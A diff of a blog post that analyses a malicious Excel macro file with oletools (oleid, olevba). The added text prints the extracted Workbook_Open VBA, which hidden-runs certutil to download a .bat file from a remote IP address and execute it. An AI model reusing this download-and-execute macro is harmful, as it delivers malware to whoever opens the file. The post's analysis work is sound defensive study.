@@ -22,11 +22,49 @@ MDE, which has improved over the past few years a lot and I like to recommend, a
 
 <img src="../img/blog-22-ukrainianmw-mdescan.png" width="750">
 
-After downloading it and allowing any protection software to work and investigate further, we can use [oleid](https://github.com/decalage2/oletools) to check if there Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis, forensics and debugging. 
+After downloading it and allowing it on any protection software to work so we can investigate further, we can use [oleid](https://github.com/decalage2/oletools) to check if there Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis, forensics and debugging. 
+
+This time, I have used Windows, though everything and more is possible on Kali or any other linux distribution. On Windows you need to make sure to add the python PATH variables. 
 
 ```
+pip3 install -U --user https://github.com/decalage2/oletools/archive/master.zip
+pip3 install XLMMacroDeobfuscator
+cd downloads
 oleid malware.xlsm
 ```
+
+<img src="../img/blog-22-ukrainianmw-oleid.png" width="750">
+
+Somehow, either SentinelOne or MDE removed the macro even after allowing the software. So I redownloaded it and started the scan on the file directly again. This time we get a supicious macro hit.
+
+<img src="../img/blog-22-ukrainianmw-oleid2.png" width="750">
+
+Suspicious macros can be checked with olevba and hand us more information of things that are happening here.
+
+```
+olevba malware.xlsm
+```
+
+<img src="../img/blog-22-ukrainianmw-olevba.png" width="750">
+
+Here we will find out that the tool detected a malicious macro that will run when macros are enabled.
+
+```vba
+Private Sub Workbook_Open()
+PID = Shell("cmd /c certutil.exe -urlcache -split -f ""http://3.112.243.28/net/Ugrfa.bat"" Opcbuyjhg.exe.exe && Opcbuyjhg.exe.exe", vbHide)
+End Sub
+```
+
+The certutil.exe is a legitimate software, but used to download a binary (Ugrfa.bat) from a remote server and run it. The URL is classified as malicious by multiple vendors per VirusTotal.
+
+<img src="../img/blog-22-ukrainianmw-ugrfa.bat.png" width="1000">
+
+
+
+
+
+
+
 
 
 
